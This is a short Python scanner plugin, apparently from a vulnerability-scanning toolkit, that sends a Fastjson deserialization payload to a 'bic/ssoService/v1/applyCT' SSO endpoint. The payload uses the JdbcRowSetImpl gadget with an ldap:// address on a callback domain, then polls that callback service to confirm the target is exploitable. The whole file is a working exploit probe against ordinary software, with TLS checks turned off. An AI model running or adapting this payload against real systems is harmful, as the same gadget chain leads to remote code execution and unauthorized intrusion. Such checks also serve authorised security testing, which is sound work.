import requests,re,urllib3,time
import sys,os
cwd=os.getcwd()
sys.path.append(cwd+'\\reverse')
from getdomain import get_domain
from getresult import get_result
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
rand=randomInt(100000, 200000)
def description():
	link='https://mp.weixin.qq.com/s/y30HwEfYsMyndk1Ra1zz8w'
	return link
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	gets=get_domain()
	domain=gets[0]
	token=gets[1]
	url=baseurl+"bic/ssoService/v1/applyCT"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0","Content-Type": "application/json"}
	body='{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://'+domain+'","autoCommit":true},"hfe4zyyzldp":"="}'
	response=requests.post(url,body,headers=headers,timeout=30,verify=False)
	time.sleep(2)
	if get_result(domain,token):
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
